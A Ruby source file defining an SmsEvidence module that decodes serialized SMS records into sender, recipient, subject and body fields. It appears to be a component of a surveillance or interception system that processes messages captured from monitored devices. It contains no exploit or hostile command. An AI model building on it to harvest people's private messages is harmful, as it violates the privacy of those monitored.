require_relative 'common'
require 'rcs-common/serializer'

module RCS
  module SmsEvidence
    def content
      raise "Not implemented!"
    end

    def generate_content
      raise "Not implemented!"
    end

    def decode_content(common_info, chunks)

      info =  Hash[common_info]
      info[:data] ||= Hash.new
      info[:data][:type] = :sms

      stream = StringIO.new chunks.join
      @sms = MAPISerializer.new.unserialize stream

      info[:data][:from] = @sms.fields[:from]
      info[:data][:rcpt] = @sms.fields[:rcpt]
      info[:data][:subject] = @sms.fields[:subject]
      info[:data][:content] = @sms.fields[:text_body]

      yield info if block_given?
      :keep_raw
    end
  end # ::CalendarEvidence
end # ::RCS
